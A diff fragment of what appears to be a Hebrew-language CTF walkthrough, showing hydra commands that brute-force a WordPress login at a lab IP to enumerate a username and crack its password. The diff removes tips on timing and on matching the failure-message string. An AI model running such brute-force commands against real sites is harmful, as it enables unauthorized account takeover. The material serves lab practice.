@@ -144,13 +144,7 @@ hydra -L fs-list -p test 10.112.177.29 http-post-form "/wp-login.php:log=^USER^&
 Bash
 hydra -l elliot -P fs-list 10.112.177.29 http-post-form "/wp-login.php:log=^USER^&pwd=^PASS^:F=The password you entered" -t 64
 
-תוצאה: הסיסמה נמצאה בהצלחה (היא תופיע בשורה ירוקה בטרמינל).
-
-דגשים חשובים לביצוע אצלך:
-
-זמן: המתקפה השנייה עלולה לקחת זמן (כמה דקות טובות), תלוי במיקום הסיסמה בתוך המילון.
-
-הודעת שגיאה: שים לב שבפקודה השנייה, הפרמטר :F= חייב להתאים בדיוק להודעת השגיאה שהאתר מחזיר כשמזינים סיסמה לא נכונה (למשל: "The password you entered for the username elliot is incorrect").
+תוצאה: הסיסמה נמצאה בהצלחה (היא תופיע בשורה ירוקה בטרמינל)
 
 
 
